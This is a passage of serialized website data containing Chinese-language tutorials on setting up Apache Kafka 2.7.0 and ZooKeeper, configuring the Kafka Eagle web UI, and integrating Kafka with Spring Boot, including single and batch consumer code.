ui，安装方式：https://cloud.tencent.com/developer/article/1667262 下载地址：https://github.com/wolfogre/kafka-manager-docker/releases\n\n\n# 参数解析\n\n每个 broker 的唯一非负整数 id 的标识。\n\nbroker.id=0\n\n\n1\n\n\nkafka 存放数据的路径，路径并不是只可以写一个，可以写多个用逗号分割，\n\nlog.dirs=/tmp/kafka-logs\n\n\n1\n\n\nzookeeper 的连接\n\nzookeeper.connect=host:port,host:port\n\n\n1\n\n\ntopic 的默认分区数量，一般消费者的数量尽量和分区数保持一致 1:1，否则会造成多个 消费者消费一个分区，或者分区过大，消费者消费不即时 (1 条 1 条消费)\n\nnum.partitions=1\n\n\n1\n\n\ntopic 分区里每个 log 文件的最大值\n\nlog.segment.bytes=1024*1024*1024\n\n\n1\n\n\n即使以上参数没有达到文件的最大值，当创建时间达（24*7 = 一周）到此属性值，就会创建文件。\n\nlog.roll.hours=24*7\n\n\n1\n\n\n每个 log index 的最大尺寸。如果 log index 尺寸达到这个数值，即使尺寸没有超过 log.segment.bytes 限制，也需要产生新得 log index\n\nlog.index.size.max.bytes\n\n\n1\n\n\n如果一个 follower 在这个时间内没有发送 fetch 请求，leader 将从 ISR 中移除这个 follower\n\nreplica.lag.time.max.ms=10000\n\n\n1\n\n\n备份时每次 fetch 的最大值\n\nreplica.lag.fetch.max.bytes=1024*1024\n\n\n1\n\n\n指明了是否能够使不在 ISR 中 replicas 设置用来做为 leader\n\nunclean.leader.election.enable=true\n\n\n1\n\n\n是否能够删除 topic\n\ndelete.topic.enable=false\n\n\n1\n\n\n生产者设置 kafka 集群\n\nboostrap.servers=host:port,host:port\n\n\n1\n\n\n生产者 ack 消息确定机制\n\nacks=1\n\n\n1\n\n\n生产者批量发送消息 (以 16384 字节数为一批)，此参数调整须是 1024 整数倍\n\nbatch.size=16384\n\n\n1\n\n\n生产者发送消息的间隔，0 代表有数据立马发送，如果要使用批处理，该值建议调在 1s 以内，根据实际数据量的大小计算。\n\nlinger.ms=0\n\n\n1\n\n\n\n# 阿里云中部署注意事项\n\n阿里云中的端口开放需要如下方式，使用 iptables 根本无效\n\nfirewall-cmd --zone=public --add-port=2181/tcp --permanent\nfirewall-cmd --zone=public --add-port=9092/tcp --permanent\nfirewall-cmd --zone=public --add-port=3306/tcp --permanent\n\n\n1\n2\n3\n\n\n配置 IP 需要注意，zookeeper 可以直接走内网，加到 zookeeper 链接超时时间\n",normalizedContent:"# 搭建\n\nwget https://mirrors.tuna.tsinghua.edu.cn/apache/kafka/2.7.0/kafka_2.13-2.7.0.tgz\n\ntar -xzf kafka_2.13-2.7.0.tgz\ncd kafka_2.13-2.7.0\n\n\n1\n2\n3\n4\n\n\n> 下载的 kafka 自带有 zookeeper，但很快，zookeeper 将不再被 apache kafka 所需要。\n\n\n# 文件介绍\n\nkafka 安装好以后包含有以下文件\n\n[root@localhost kafka_2.13-2.7.0]# ls\nbin  config  libs  license  notice  site-docs\n\n\n1\n2\n\n * bin 包含 kafka 的 topic 脚本、kafka 启动脚本、zookeeper 启动脚本、生产者脚本、消费者脚本等\n * config 包含生产者配置、消费者配置、zookeeper 配置、kafka 配置以及一些 connect 配置\n * libs 主要是一些 jar 文件\n\n> 应用程序一般做为生产者和消费者，对于 kafka 服务配置只需要关心 zookeeper 和 kafka 本身配置即可，其余在应用本身可以控制\n\n\n# 基础命令\n\n创建 topic，--replication-factor 副本数量 ，--partitions 分区数量，副本数量最好小于集群数量\n\n./kafka-topics.sh --create --zookeeper ip:2181  --replication-factor 1 --partitions 1 --topic topic_name\n\n\n1\n\n\n删除 topic\n\n./kafka-topics.sh --delete --zookeeper ip:2181 --topic topic_name\n\n\n1\n\n\n查看所有的 topic\n\n./kafka-topics.sh --list --zookeeper ip:2181 \n\n\n1\n\n\n查看某一个 topic 的详情\n\n./kafka-topics.sh --zookeeper ip:2181 --describe --topic topic_name\n\n\n1\n\n\n启动 producer\n\n./kafka-console-producer.sh --broker-list ip:9092  --topic topic_name\n\n\n1\n\n\n启动 consumer，--from-beginning 从头开始消费，没有之前生产的数据会丢弃\n\n./kafka-console-consumer.sh --bootstrap-server ip:9092  --topic topic_name --from-beginning\n\n\n1\n\n\n\n# 启动\n\n启动 zookeeper\n\n# 先修改配置\nvim /config/zookeeper.properties\n\nzookeeper.connect=192.168.81.62:2181\nclientportaddress=192.168.81.62\n# 启动\nbin/zookeeper-server-start.sh -daemon config/zookeeper.properties\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n配置 kafka，并启动，如果是集群模式的话，只需要改 broker.id 即可\n\n# 先修改配置\nvim /config/server.properties\n\n# 集群模式下broker.id 必须唯一\nbroker.id=0\n# 消息的存储位置(持久化位置)\nlog.dirs=/tmp/kafka-logs\n# 配置kafka允许被连接的ip和端口\nlisteners=plaintext://192.168.81.62:9092\n# zookeeper连接 多台zookeeper ',' 逗号分割\nzookeeper.connect=192.168.81.62:2181\n# 启动\nbin/kafka-server-start.sh -daemon config/server.properties\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n成功启动所有服务后，您将运行并可以使用基本的 kafka 环境。\n\n> 先关闭 kafka 再关闭 zookeeper，若先关闭了 zookeeper 导致 kafka 无法关闭，可以再启动 zookeeper 后关闭 kafka。\n\n\n# kafka web ui\n\n官方文档，我下载到了 window 本机，并没有在 linux 上操作，首先该 ui 要求有 java8 的环境配置中，然后把下载解压的文件也配置到环境变量中，否则会启动报错，而且变量必须叫 ke_home。\n\n\n\n然后修改 d:\\tools\\kafka-eagle-web-2.0.4\\conf\\system-config.properties，复制以下配置到你的文件中就好了，很多的配置使用不到的，只需要修改 数据库连接 和 cluster1.zk.list 地址就好\n\n######################################\n# multi zookeeper & kafka cluster list\n######################################\nkafka.eagle.zk.cluster.alias=cluster1\ncluster1.zk.list=192.168.81.62:2181\n\n######################################\n# zookeeper enable acl\n######################################\ncluster1.zk.acl.enable=false\n\n######################################\n# broker size online list\n######################################\ncluster1.kafka.eagle.broker.size=20\n\n######################################\n# zk client thread limit\n######################################\nkafka.zk.limit.size=32\n\n######################################\n# kafka eagle webui port\n######################################\nkafka.eagle.webui.port=8048\n\n######################################\n# kafka jmx acl and ssl authenticate\n######################################\ncluster1.kafka.eagle.jmx.acl=false\n\n######################################\n# kafka offset storage\n######################################\ncluster1.kafka.eagle.offset.storage=kafka\n#cluster2.kafka.eagle.offset.storage=zk\n\n######################################\n# kafka jmx uri\n######################################\n#cluster1.kafka.eagle.jmx.uri=service:jmx:rmi:///jndi/rmi://%s/jmxrmi\n\n######################################\n# kafka metrics, 15 days by default\n######################################\nkafka.eagle.metrics.charts=true\nkafka.eagle.metrics.retain=15\n\n######################################\n# kafka sql topic records max\n######################################\nkafka.eagle.sql.topic.records.max=5000\n\n######################################\n# delete kafka topic token\n######################################\nkafka.eagle.topic.token=keadmin\n\n######################################\n# kafka mysql jdbc driver address\n######################################\nkafka.eagle.driver=com.mysql.cj.jdbc.driver\nkafka.eagle.url=jdbc:mysql://192.168.81.61:3306/ke?useunicode=true&characterencoding=utf-8&zerodatetimebehavior=converttonull\nkafka.eagle.username=root\nkafka.eagle.password=admin@123\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n\n\n启动 d:\\tools\\kafka-eagle-web-2.0.4\\bin\\ke.bat\n\n看到 tomcat 打印，需要多等待一些时间，如果等待太久可以先关闭 kafka 服务。\n\n2021-02-20 16:44:06 info  [zookeeper.thread-236] - initiating client connection, connectstring=192.168.81.62:2181 sessiontimeout=30000 watcher=kafka.zookeeper.zookeeperclient$zookeeperclientwatcher$@7bac5016\n2021-02-20 16:44:06 info  [zookeeperclient.thread-236] - [zookeeperclient] waiting until connected.\n\n\n1\n2\n\n\n\n\n> 常见的 web ui，安装方式：https://cloud.tencent.com/developer/article/1667262 下载地址：https://github.com/wolfogre/kafka-manager-docker/releases\n\n\n# 参数解析\n\n每个 broker 的唯一非负整数 id 的标识。\n\nbroker.id=0\n\n\n1\n\n\nkafka 存放数据的路径，路径并不是只可以写一个，可以写多个用逗号分割，\n\nlog.dirs=/tmp/kafka-logs\n\n\n1\n\n\nzookeeper 的连接\n\nzookeeper.connect=host:port,host:port\n\n\n1\n\n\ntopic 的默认分区数量，一般消费者的数量尽量和分区数保持一致 1:1，否则会造成多个 消费者消费一个分区，或者分区过大，消费者消费不即时 (1 条 1 条消费)\n\nnum.partitions=1\n\n\n1\n\n\ntopic 分区里每个 log 文件的最大值\n\nlog.segment.bytes=1024*1024*1024\n\n\n1\n\n\n即使以上参数没有达到文件的最大值，当创建时间达（24*7 = 一周）到此属性值，就会创建文件。\n\nlog.roll.hours=24*7\n\n\n1\n\n\n每个 log index 的最大尺寸。如果 log index 尺寸达到这个数值，即使尺寸没有超过 log.segment.bytes 限制，也需要产生新得 log index\n\nlog.index.size.max.bytes\n\n\n1\n\n\n如果一个 follower 在这个时间内没有发送 fetch 请求，leader 将从 isr 中移除这个 follower\n\nreplica.lag.time.max.ms=10000\n\n\n1\n\n\n备份时每次 fetch 的最大值\n\nreplica.lag.fetch.max.bytes=1024*1024\n\n\n1\n\n\n指明了是否能够使不在 isr 中 replicas 设置用来做为 leader\n\nunclean.leader.election.enable=true\n\n\n1\n\n\n是否能够删除 topic\n\ndelete.topic.enable=false\n\n\n1\n\n\n生产者设置 kafka 集群\n\nboostrap.servers=host:port,host:port\n\n\n1\n\n\n生产者 ack 消息确定机制\n\nacks=1\n\n\n1\n\n\n生产者批量发送消息 (以 16384 字节数为一批)，此参数调整须是 1024 整数倍\n\nbatch.size=16384\n\n\n1\n\n\n生产者发送消息的间隔，0 代表有数据立马发送，如果要使用批处理，该值建议调在 1s 以内，根据实际数据量的大小计算。\n\nlinger.ms=0\n\n\n1\n\n\n\n# 阿里云中部署注意事项\n\n阿里云中的端口开放需要如下方式，使用 iptables 根本无效\n\nfirewall-cmd --zone=public --add-port=2181/tcp --permanent\nfirewall-cmd --zone=public --add-port=9092/tcp --permanent\nfirewall-cmd --zone=public --add-port=3306/tcp --permanent\n\n\n1\n2\n3\n\n\n配置 ip 需要注意，zookeeper 可以直接走内网，加到 zookeeper 链接超时时间\n",charsets:{cjk:!0}},{title:"kafka-2.7.0 spring boot 集成 kafka",frontmatter:{title:"kafka-2.7.0 spring boot 集成 kafka",date:"2023-06-25T09:22:36.000Z",permalink:"/kafka/1402",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/02.%E4%B8%AD%E9%97%B4%E4%BB%B6/01.kafka/1402.kafka-2.7.0%20spring%20boot%20%E9%9B%86%E6%88%90%20kafka.html",relativePath:"02.中间件/01.kafka/1402.kafka-2.7.0 spring boot 集成 kafka.md",key:"v-2674598f",path:"/kafka/1402/",headers:[{level:2,title:"依赖",slug:"依赖",normalizedTitle:"依赖",charIndex:2},{level:2,title:"配置",slug:"配置",normalizedTitle:"配置",charIndex:367},{level:2,title:"生产与消费",slug:"生产与消费",normalizedTitle:"生产与消费",charIndex:5093},{level:2,title:"批量消费",slug:"批量消费",normalizedTitle:"批量消费",charIndex:4062}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"依赖 配置 生产与消费 批量消费",content:'# 依赖\n\n<dependencies>\n    \x3c!-- 2.3.7 --\x3e\n    <dependency>\n        <groupId>org.springframework.kafka</groupId>\n        <artifactId>spring-kafka</artifactId>\n    </dependency>\n    <dependency>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-autoconfigure</artifactId>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# 配置\n\nspring:\n  kafka:\n    ###########【kafka集群】###########\n    # 192.168.81.62:9092,192.168.81.62:9092\n    bootstrap-servers: 47.101.179.240:9092\n    ###########【初始化生产者配置】###########\n    producer:\n      # 重试次数，producer 两次重试之间会停顿一段时间，以防止频繁地重试对系统带来冲击。这段时间是可以配置的，由参数 retry.backoff.ms 指定，默认是 100 毫秒\n      # 重试可能造成消息的重复发送,为了应对这一风险， Kafka 要求用户在 consumer 端必须执行去重处理\n      # 重试可能造成消息的乱序，producer 提供了 max.in.flight.requets.per.connection参数 一旦用户将此参数设置成 1, producer 将确保某一时刻只能发送一个请求\n      retries: 2\n      # acks=0 ： producer 不等kafka是否接收成功，立即开始其他工作 -> 提高吞吐量，单会丢失数据\n      # acks=1 ： producer 发送消息后 leader broker 仅将该消息写入本地日志，然后便发送响应结果 producer ，而无须等待 ISR 中其他副本写入该消息。能保证吞吐量，也能保证一定的持久性。\n      # acks=all/-1 ：表示当发送消息时， leader broker 不仅会将消息写入本地日志，同时还会等待 ISR 中所有其他副本都成功写入它们各自的本地日志后，才发送响应结果给producer。吞吐量极低，但不会丢失数据。\n      acks: 1\n      # 参数默认值是 16384B=16KB。producer 会将发往同一分区的多条消息封装进一个 batch 中。当 batch 满了的时候， producer 会发送 batch\n      # 中的所有消息。不过， producer 并不总是 batch 满了才发送消息，很有可能当 batch 还有很多空闲空间时 producer 就发送该 batch，\n      # producer 不管是否能够填满， producer 都会为该 batch 分配固定大小的内存。\n      batch-size: 131072\n      properties:\n        # 控制消息发送延时行为,这个参数也就是影响 batch 不满也会被发送的原因，实际上这也是一种权衡，即吞吐量与延时之间的权衡\n        linger.ms: 200\n        # produce 发送请求给broker后，broker需要在规定的时间范围内将处理理结果返还给 produce。这段时间便是由该参数控制的，默认是 30s。\n        # 默认的30s对于一般的情况而言是足够的，但如果 producer 发送的负载很大，超时的情况就很容易碰到，此时就应该适当调整该参数值。\n        request.timeout.ms: 30\n        # 控制 producer 发送请求的大小，1048576B=1M，该请求包括消息体和请求头的整体大小\n        max.request.size: 1048576\n        # 为防止 topic 同分区下的消息乱序问题。这个参数的实际效果其实限制了 producer 在单个 broker 连接上能够发送的未响应请求的数量\n        # 设置成1 ,producer 在某个 broker 发送响应之前将无法再给该 broker 发送 PRODUCE 请求\n        max.in.flight.requests.per.connection: 1\n      # buffer-memory 生产端缓冲区大小，默认值 33554432B=32MB。\n      # producer 启动时会首先创建一块内存缓冲区用于保存待发送的消息，然后由另一个专属线程负责从缓冲区中读取消息执行真正的发送。这部分内存空间\n      # 的大小即是由 buffer.memory 参数指定的。若 producer 向缓冲区写消息的速度超过了专属 io 线程发送消息的速度，那么必然造成该缓冲区空间\n      # 的不断增大。此时 producer 会停止手头的工作等待 io 线程追上来，若一段时间之后 io 线程还是无法追上 producer 的进度，那么 producer\n      # 就会抛出异常并期望用户介入进行处理。若 producer 程序要给很多分区发送消息，那么就需要仔细地设置这个参数以防止过小的内存缓冲区降低了\n      # producer 程序整体的吞吐量。\n      buffer-memory: 33554432\n      # Kafka提供的序列化和反序列化类\n      key-serializer: org.apache.kafka.common.serialization.StringSerializer\n      value-serializer: org.apache.kafka.common.serialization.StringSerializer\n      # 压缩，默认 none(gzip\\snappy\\lz4)，能降低网络IO提高吞吐量，但也会增加 producer 端机器的 CPU 开销。\n      # 如果 broker 端的压缩参数设 置得与 producer 不同， broker 端在写入消息时也会额外使用 CPU 资源对消息进行对应的解压缩－重压缩操作。\n      compression-type: lz4\n    ###########【初始化消费者配置】###########\n    consumer:\n      # 默认的消费组ID\n      groupId: wx_public_number\n      properties:\n        # 消费会话超时时间(超过这个时间consumer没有发送心跳,就会触发rebalance操作)\n        session.timeout.ms: 10000\n        # 消费请求超时时间\n        request.timeout.ms: 3000\n        # 消费到的数据处理时长不宜超过max.poll.interval.ms，否则会触发rebalance，也可能导致 offset 提交失败\n        max.poll.interval.ms: 10000\n        # 最低拉取 1KB 的数据\n        fetch.min.bytes: 1024\n        # 不足 1KB 让等待 2s 再去拉取\n        fetch.max.wait.ms: 2000\n      # 是否自动提交 consumer offset，批量的时候要改为 false\n      enable-auto-commit: true\n      # 自动提交的时间间隔\n      auto-commit-interval: 200\n      # 假设你首次运行一个 consumer group 并且指定从头消费。显然该 group 会从头消费所有数据，因为此时该 group 还没有任何位移信息。\n      # 一旦该 group 成功提交位移后，你重启了 group ，依然指定从头消费。此时你会发现该 group 并不会真的从头消费，因为 Kafka 己经保存了该 group\n      # 位移信息，因此它会无视 auto.offset.reset 的设置。\n      # latest（默认值）指定从最新处位移开始消费\n      # earliest ：指定从最早的位移开始消费，注意这里最早的位移不一定就是0\n      # none:只要有一个分区不存在已提交的offset,就抛出异常;\n      auto-offset-reset: earliest\n      # Kafka提供的序列化和反序列化类\n      key-deserializer: org.apache.kafka.common.serialization.StringDeserializer\n      value-deserializer: org.apache.kafka.common.serialization.StringDeserializer\n      # 批量消费每次最多消费多少条消息\n      max-poll-records: 10000\n      # Fetch请求发给 broker后，在broker中可能会被阻塞的（当topic中records的总size小于fetch.min.bytes时），此时这个fetch请求耗时就会比较长。这个配置就是来配置consumer最多等待response多久。毫秒数\n      fetch-max-wait: 1000\n    # 消费端监听的topic不存在时，项目启动会报错(关掉)\n    listener:\n      # 消费者并发启动个数（对应分区个数）每个listener方法\n      concurrency: 4\n      # manual listener负责ack，但是背后也是批量上去\n      # manual_immediate listner负责ack，每调用一次，就立即commit\n      # count_time ackTime或ackCount哪个条件先满足，就commit\n      # count 累积达到ackCount次的ack去commit\n      # record 每处理一条commit一次\n      # batch 每次poll的时候批量提交一次，频率取决于每次poll的调用频率\n      # time 每次间隔ackTime的时间去commit\n      # ack-mode: manual\n      missing-topics-fatal: false\n      poll-timeout: 3000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n\n\n> groupId 一般为项目名称最好，消费者 ID 一般为业务或功能名称，topic 的设计最好是 项目_业务_功能_标识 ID\n\n\n# 生产与消费\n\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.kafka.annotation.KafkaListener;\nimport org.springframework.kafka.annotation.KafkaListeners;\nimport org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory;\nimport org.springframework.kafka.config.KafkaListenerContainerFactory;\nimport org.springframework.kafka.config.TopicBuilder;\nimport org.springframework.kafka.core.DefaultKafkaConsumerFactory;\nimport org.springframework.kafka.core.KafkaTemplate;\nimport org.springframework.kafka.support.Acknowledgment;\n\nimport javax.annotation.Resource;\nimport java.util.List;\n\n@SpringBootApplication\npublic class KafkaApplication implements CommandLineRunner {\n\n\t@Resource\n\tKafkaTemplate<String, String> kafkaTemplate;\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(KafkaApplication.class, args);\n\t}\n\n\t@Override\n\tpublic void run(String... args){\n\t\tProducerRecord<String, String> producerRecord = new ProducerRecord<>("topic1", "11111");\n\t\tkafkaTemplate.send(producerRecord);\n\t}\n\n\t/**\n\t * 创建 topic\n\t * @author big uncle\n\t * @date 2021/2/20 10:49\n\t * @param\n\t * @return org.apache.kafka.clients.admin.NewTopic\n\t **/\n\t@Bean\n\tpublic NewTopic topic() {\n\t\treturn TopicBuilder.name("topic1")\n\t\t\t\t.partitions(4)\n\t\t\t\t.replicas(1)\n\t\t\t\t.build();\n\t}\n\n\t/**\n\t * 消费 手动ACK 需要修改  enable-auto-commit: false\n\t**/\n\t@KafkaListener(id = "myId1", topics = "topic1",groupId="wx_public_number")\n\tpublic void listen1(String in, Acknowledgment ack) {\n\t\tSystem.out.println("aa单消费:"+in);\n\t\tack.acknowledge();\n\t}\n\t/**\n\t * 消费自动ACK 需要 enable-auto-commit: true\n\t**/\n\t@KafkaListener(id = "myId2", topics = "topic1",groupId="wx_public_number")\n\tpublic void listen2(String in) {\n\t\tSystem.out.println("bb单消费:"+in);\n\t}\n\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n> topic 的消息会被发送到不同的消费组，不同的消费组创建一个消费者会实现广播消费模式，单播的话只需要删掉多余的组就好。\n\n\n# 批量消费\n\npackage com.giant.kafka.config;\n\nimport org.apache.kafka.clients.consumer.ConsumerConfig;\nimport org.springframework.boot.autoconfigure.kafka.KafkaProperties;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.context.annotation.Configuration;\nimport org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory;\nimport org.springframework.kafka.config.KafkaListenerContainerFactory;\nimport org.springframework.kafka.core.DefaultKafkaConsumerFactory;\nimport org.springframework.kafka.listener.ContainerProperties;\n\nimport javax.annotation.Resource;\nimport java.util.HashMap;\nimport java.util.Map;\nimport java.util.function.Consumer;\n\n/**\n * kafka 批量配置\n * @Author big uncle\n * @Date 2021/7/7 10:01\n**/\n@Configuration\npublic class KafkaBatchConf {\n\n    @Resource\n    KafkaProperties properties;\n\n\n    /**\n     *  消费者批量工程\n     *  手动提交\n     */\n    @Bean\n    public KafkaListenerContainerFactory<?> batchFactoryAck() {\n        return batchFactoryTemplate(factory -> {\n            Map<String, Object> props = consumeProps();\n            // 手动提交\n            props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, Boolean.FALSE);\n            factory.setConsumerFactory(new DefaultKafkaConsumerFactory<>(props));\n            factory.getContainerProperties().setAckMode(ContainerProperties.AckMode.MANUAL_IMMEDIATE);\n        });\n    }\n\n    /**\n     *  消费者批量工程\n     *  自动提交\n     */\n    @Bean\n    public KafkaListenerContainerFactory<?> batchFactory() {\n        Map<String, Object> props = consumeProps();\n        // 最低拉取拉取数据的大小\n        props.put(ConsumerConfig.FETCH_MIN_BYTES_CONFIG,  properties.getConsumer().getProperties().get(ConsumerConfig.FETCH_MIN_BYTES_CONFIG));\n        // 不够最低拉取等待一定的时间再去拉取\n        props.put(ConsumerConfig.FETCH_MAX_WAIT_MS_CONFIG,   properties.getConsumer().getProperties().get(ConsumerConfig.FETCH_MAX_WAIT_MS_CONFIG));\n        return batchFactoryTemplate(factory -> factory.setConsumerFactory(new DefaultKafkaConsumerFactory<>(props)));\n    }\n\n    /**\n     *  消费者配置信息\n     */\n    private Map<String,Object> consumeProps() {\n        Map<String, Object> props = new HashMap<>(20);\n        // kafka server 地址\n        props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, properties.getBootstrapServers());\n        // 组id\n        props.put(ConsumerConfig.GROUP_ID_CONFIG, properties.getConsumer().getGroupId());\n        // 偏移量\n        props.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, properties.getConsumer().getAutoOffsetReset());\n        // 最大拉取条数，该参数被fetch.max.wait.ms、fetch.min.bytes、max.partition.fetch.bytes 所影响\n        props.put(ConsumerConfig.MAX_POLL_RECORDS_CONFIG, properties.getConsumer().getMaxPollRecords());\n        // 会话超时时间\n        props.put(ConsumerConfig.SESSION_TIMEOUT_MS_CONFIG, properties.getConsumer().getProperties().get(ConsumerConfig.SESSION_TIMEOUT_MS_CONFIG));\n        // 请求超时时间\n        props.put(ConsumerConfig.REQUEST_TIMEOUT_MS_CONFIG, properties.getConsumer().getProperties().get(ConsumerConfig.REQUEST_TIMEOUT_MS_CONFIG));\n        // key序列化\n        props.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, properties.getConsumer().getKeyDeserializer());\n        // 值序列化\n        props.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, properties.getConsumer().getValueDeserializer());\n        // 自动提交\n        props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, Boolean.TRUE);\n        // 自动提交时间间隔\n        Duration autoCommitInterval = properties.getConsumer().getAutoCommitInterval();\n        if(!ObjectUtil.isEmpty(autoCommitInterval)){\n            props.put(ConsumerConfig.AUTO_COMMIT_INTERVAL_MS_CONFIG, Long.valueOf(autoCommitInterval.toMillis()).intValue());\n        }\n        // poll 间隔时间\n        props.put(ConsumerConfig.MAX_POLL_INTERVAL_MS_CONFIG,  properties.getConsumer().getProperties().get(ConsumerConfig.MAX_POLL_INTERVAL_MS_CONFIG));\n        return props;\n    }\n\n\n    /**\n     * 批量消费模板\n    **/\n    private ConcurrentKafkaListenerContainerFactory batchFactoryTemplate(Consumer<ConcurrentKafkaListenerContainerFactory> consumer){\n        ConcurrentKafkaListenerContainerFactory<Integer, String> factory = new ConcurrentKafkaListenerContainerFactory<>();\n        consumer.accept(factory);\n        factory.setBatchListener(Boolean.TRUE);\n        // 并发线程数\n        factory.setConcurrency(properties.getListener().getConcurrency());\n        return factory;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n\n\nimport org.apache.kafka.clients.admin.NewTopic;\nimport org.apache.kafka.clients.consumer.ConsumerRecord;\nimport org.apache.kafka.clients.producer.ProducerRecord;\nimport org.springframework.beans.factory.annotation.Autowired;\nimport org.springframework.boot.CommandLineRunner;\nimport org.springframework.boot.SpringApplication;\nimport org.springframework.boot.autoconfigure.SpringBootApplication;\nimport org.springframework.context.annotation.Bean;\nimport org.springframework.kafka.annotation.KafkaListener;\nimport org.springframework.kafka.annotation.KafkaListeners;\nimport org.springframework.kafka.config.ConcurrentKafkaListenerContainerFactory;\nimport org.springframework.kafka.config.KafkaListenerContainerFactory;\nimport org.springframework.kafka.config.TopicBuilder;\nimport org.springframework.kafka.core.DefaultKafkaConsumerFactory;\nimport org.springframework.kafka.core.KafkaTemplate;\nimport org.springframework.kafka.support.Acknowledgment;\n\nimport javax.annotation.Resource;\nimport java.util.List;\n\n@SpringBootApplication\npublic class KafkaApplication implements CommandLineRunner {\n\n\t@Resource\n\tKafkaTemplate<String, String> kafkaTemplate;\n\n\tpublic static void main(String[] args) {\n\t\tSpringApplication.run(KafkaApplication.class, args);\n\t}\n\n\t@Override\n\tpublic void run(String... args){\n\t\tProducerRecord<String, String> producerRecord = new ProducerRecord<>("topic1", "11111");\n\t\tkafkaTemplate.send(producerRecord);\n\t}\n\n\t/**\n\t * 创建 topic\n\t * @author big uncle\n\t * @date 2021/2/20 10:49\n\t * @param\n\t * @return org.apache.kafka.clients.admin.NewTopic\n\t **/\n\t@Bean\n\tpublic NewTopic topic() {\n\t\treturn TopicBuilder.name("topic1")\n\t\t\t\t.partitions(4)\n\t\t\t\t.replicas(1)\n\t\t\t\t.build();\n\t}\n\n    /**\n     * 批量自动确认ACK\n    **/\n    @KafkaListener(id = "consumer_1", topics = "topic1",groupId="wx_public_number",containerFactory = "batchFactory")\n    public void consumer_1(List<String> in) {\n        log.debug("消费数据 {}",in.size());\n    }\n\n    /**\n     * 批量手动确认ACK\n    **/\n    @KafkaListener(id = "consumer_2", topics = "topic1",groupId="wx_public_number",containerFactory = "batchFactoryAck")\n    public void consumer_2(List<String> in,Acknowledgment ack) {\n        log.debug("消费数据 {}",in.size());\n        ack.acknowledge();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n批量消费和单条消费不影响相互使用。\n\n按不同分区消费\n\n@KafkaListener(id = "consumer_2", topicPartitions = { @TopicPartition(topic = "topic1", partitions = { "1" }) },groupId="wx_public_number")\npublic void consumer_2(String str) {\n    log.debug("消费数据 {}",str);\n}\n\n\n1\n2\n3\n4\n\n\n> key 和 partition 的区别\n> 如果一个有效的 partition 属性数值被指定，那么在发送记录时 partition 属性数值就会被应用。如果没有 partition 属性数值被指定，而一个 key 属性被声明的话，一个 partition 会通过 key 的 hash 而被选中。如果既没有 key 也没有 partition 属性数值被声明，那么一个 partition 将会被分配以轮询的方式。',normalizedContent:'# 依赖\n\n<dependencies>\n    \x3c!-- 2.3.7 --\x3e\n    <dependency>\n        <groupid>org.springframework.kafka</groupid>\n        <artifactid>spring-kafka</artifactid>\n   